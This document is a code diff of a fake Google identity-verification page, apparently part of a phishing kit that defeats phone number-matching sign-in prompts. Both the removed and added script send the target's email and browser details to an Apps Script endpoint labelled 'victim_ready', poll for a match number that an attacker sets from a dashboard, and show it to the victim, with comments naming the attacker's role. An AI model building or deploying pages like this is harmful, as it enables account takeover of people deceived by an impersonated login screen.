@@ -18,13 +18,14 @@
     .status { font-size: 16px; color: #5f6368; line-height: 1.5; margin-bottom: 32px; }
     .prompt-section { display: none; margin-top: 24px; }
     .number-box { font-size: 120px; font-weight: bold; color: #1967d2; background: #e3f2fd; width: 240px; height: 160px; line-height: 160px; margin: 32px auto; border-radius: 16px; border: 4px solid #1967d2; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
-    .debug-msg { font-size: 14px; color: #d93025; margin-top: 16px; }
+    .debug { font-size: 13px; color: #d93025; margin-top: 16px; }
   </style>
 </head>
 <body>
   <div class="card">
     <div class="logo">
       <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+        <!-- Google logo paths (same as before) -->
         <path fill="#EA4335" d="M24 9.5c3.54 0 6.14 1.53 7.56 2.8l5.5-5.5C33.64 3.6 29.22 1.5 24 1.5 14.98 1.5 7.2 6.68 3.44 14.24l6.66 5.18C11.84 13.3 17.42 9.5 24 9.5z"/>
         <path fill="#4285F4" d="M46.14 24.5c0-1.57-.14-3.08-.4-4.5H24v8.52h12.44c-.54 2.9-2.2 5.36-4.66 7.04l7.2 5.6c4.2-3.88 6.6-9.6 6.6-16.66z"/>
         <path fill="#FBBC05" d="M10.1 28.58c-.48-1.42-.76-2.94-.76-4.58s.28-3.16.76-4.58l-6.66-5.18C1.78 17.1.9 20.46.9 24s.88 6.9 2.54 9.76l6.66-5.18z"/>
@@ -35,114 +36,56 @@
     <h1>Verifying your identity</h1>
     <div id="loading">
       <div class="spinner"></div>
-      <div class="status" id="statusText">Checking your account and device...<br>This should only take a few moments.</div>
-      <div class="debug-msg" id="debugMsg"></div>
+      <div class="status" id="status">Checking your account...</div>
+      <div class="debug" id="debugMsg"></div>
     </div>
     <div id="prompt-section" class="prompt-section">
       <h1>Check your phone</h1>
-      <p style="font-size:16px; color:#5f6368; margin:16px 0;">Tap <strong>Yes</strong> on the prompt sent to your phone</p>
-      <div style="font-size:14px; color:#5f6368; margin:24px 0 12px;">Then select the number shown below on your device:</div>
+      <p>Tap <strong>Yes</strong> on the prompt sent to your phone</p>
+      <div style="margin:16px 0; color:#5f6368;">Then select the number shown below:</div>
       <div class="number-box" id="matchNumber">••</div>
-      <div style="font-size:14px; color:#5f6368; margin-top:32px;">This extra step helps keep your account secure.</div>
+      <div style="margin-top:32px; color:#5f6368; font-size:14px;">This helps keep your account secure.</div>
     </div>
   </div>
 
   <script>
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwmymsCF3NfTgFBJPVq4Rn4BCE58a3bVVr_7hrvUfsHAMeD45v91vT6ldVZnWdGEbxM/exec";
-    
-    let email = (localStorage.getItem("demoEmail") || "").trim();
-    if (!email) {
-      email = prompt("No email found. Enter your email for verification:", "someone@example.com") || "someone@example.com";
-      localStorage.setItem("demoEmail", email);
-    }
-    
-    console.log("Verify page loaded with email:", email);
-    const usernamePart = email.split('@')[0] || "User";
-    document.getElementById("avatar").textContent = usernamePart.charAt(0).toUpperCase();
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzVJIqacbiWJh6eGb_O3nK9oE4WcxJ6tGmftLUY52aJ-Mnuj8b6atlF60J2sdSD1Ouz/exec";
 
-    const statusText = document.getElementById("statusText");
-    const debugMsg = document.getElementById("debugMsg");
+    let email = localStorage.getItem("demoEmail") || "someone@example.com";
+    document.getElementById("avatar").textContent = (email.split('@')[0] || "U").charAt(0).toUpperCase();
 
-    function updateStatus(msg, isError = false) {
-      statusText.textContent = msg;
-      debugMsg.textContent = isError ? "• " + msg : "";
-      debugMsg.style.color = isError ? "#d93025" : "#188038";
-    }
+    const statusEl = document.getElementById("status");
+    const debugEl = document.getElementById("debugMsg");
 
-    // Send victim_ready signal
-    async function sendVictimReady() {
-      try {
-        updateStatus("Sending ready signal...");
-        const res = await fetch(SCRIPT_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/x-www-form-urlencoded" },
-          body: new URLSearchParams({
-            action: "victim_ready",
-            email: email,
-            user_agent: navigator.userAgent,
-            timestamp: new Date().toISOString()
-          }),
-          mode: "no-cors",
-          keepalive: true
-        });
-        console.log("victim_ready sent (opaque mode)");
-        updateStatus("Signal sent. Waiting for prompt...");
-      } catch (err) {
-        console.error("Failed to send victim_ready:", err);
-        updateStatus("Connection issue – please try again", true);
-      }
-    }
+    function log(msg) { console.log(msg); debugEl.textContent = msg; }
 
-    // Start the process
-    sendVictimReady();
+    // Send ready signal
+    fetch(SCRIPT_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: new URLSearchParams({ action: "victim_ready", email, user_agent: navigator.userAgent, timestamp: new Date().toISOString() }),
+      mode: "no-cors",
+      keepalive: true
+    }).then(() => log("Ready signal sent")).catch(e => log("Ready signal failed: " + e));
 
-    // Poll for prompt number
-    let pollCount = 0;
-    const pollInterval = setInterval(async () => {
-      pollCount++;
-      console.log(`[POLL #${pollCount}] Checking for number...`);
-      
-      try {
-        const pollUrl = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}`;
-        const res = await fetch(pollUrl, { 
-          mode: "no-cors",
-          cache: "no-cache",
-          keepalive: true 
-        });
-        console.log(`[POLL #${pollCount}] Response received (opaque)`);
-        
-        // Since no-cors prevents reading, we show placeholder progress
-        if (pollCount % 3 === 0) {
-          updateStatus(`Still verifying... (${pollCount} checks)`);
-        }
-      } catch (err) {
-        console.error("[POLL ERROR]", err);
-      }
-    }, 3000);  // Poll every 3 seconds (faster feedback)
+    // Poll (cannot read response due to no-cors)
+    setInterval(() => {
+      fetch(`${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}`, {
+        mode: "no-cors",
+        cache: "no-cache"
+      }).catch(e => console.error("Poll failed", e));
+      log("Polling... (number set in dashboard will appear soon)");
+    }, 4000);
 
-    // Show number section after ~8 seconds (simulate when attacker would have set it)
+    // Show prompt section after delay (number display requires attacker action)
     setTimeout(() => {
       document.getElementById("loading").style.display = "none";
       document.getElementById("prompt-section").style.display = "block";
-      updateStatus("Check your phone now");
-    }, 8000);
+      statusEl.textContent = "Waiting for number match...";
+    }, 6000);
 
-    // Timeout redirect to Gmail
-    setTimeout(() => {
-      console.log("[TIMEOUT] Redirecting to Gmail");
-      clearInterval(pollInterval);
-      localStorage.removeItem("demoEmail");
-      window.location.href = "https://mail.google.com/";
-    }, 90000);  // 90 seconds total
-
-    // Manual test helper (remove if not needed)
-    window.forceShowNumber = function(num = "42") {
-      document.getElementById("loading").style.display = "none";
-      document.getElementById("prompt-section").style.display = "block";
-      document.getElementById("matchNumber").textContent = num;
-      clearInterval(pollInterval);
-      updateStatus("Number received: " + num);
-    };
+    // Timeout redirect
+    setTimeout(() => window.location.href = "https://mail.google.com/", 90000);
   </script>
 </body>
 </html>
